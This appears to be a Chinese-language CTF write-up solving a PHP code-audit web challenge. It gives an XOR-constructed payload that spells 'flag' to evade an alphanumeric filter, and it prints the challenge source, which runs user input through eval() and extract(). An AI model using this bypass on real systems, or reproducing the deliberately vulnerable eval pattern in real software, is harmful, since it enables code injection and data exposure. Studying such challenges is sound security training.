# Web 2 OH NO!

## 题目描述

不是，什么玩意儿？

## 题目地址

[点我](http://123.249.92.229/2/2.php)

## 题目附件

[点我](http://123.249.92.229/2/gen.py)

## 考察点

php 代码审计

## 思路

`gen.py` 给了充分的提示和解题方式。访问 [网址](http://123.249.92.229/2/2.php?input=(%22]%22^%22;%22).(%22@%22^%22,%22).(%22_%22^%22%3E%22).(%22%3C%22^%22[%22)) 即可得到 flag。

对应的 payload 为 `?input=("]"^";").("@"^",").("_"^">").("<"^"[")`。

即用异或运算来绕过禁止使用字母与数字的过滤。

去混淆与无效代码后的代码为：

```php
<?php
include 'flag2.php';
highlight_file(__FILE__);

extract($_GET);

$input = $_GET['input'] ?? '';

if (!isset($input)) {
    die("N0 hacking");
}

if (preg_match('/[a-zA-Z0-9]/', $input)) {
    die("No hacking");
}

if (strlen($input) > 50) {
    die("No hack1ng");
}

// input 中除了 ^()." 这几个字符能出现多次外，其他字符只能出现一次
if (!preg_match('/^(?:[^()."]|[()."])*$/', $input) || preg_match('/(.)(?=.*\1)/', str_replace(['^', '(', ')', '.', '"'], '', $input))) {
    die("No hacking");
}

// 使用 eval() 解析并执行表达式
try {
    $parsed_value = eval("return $input;");
    // echo $parsed_value;
} catch (ParseError $e) {
    die("Invalid input");
}

// 检查计算出的变量名是否存在，防止未定义变量错误
if (!isset($$parsed_value)) {
    die("Variable n0t set");
}

// 输出变量值
echo $$parsed_value;
```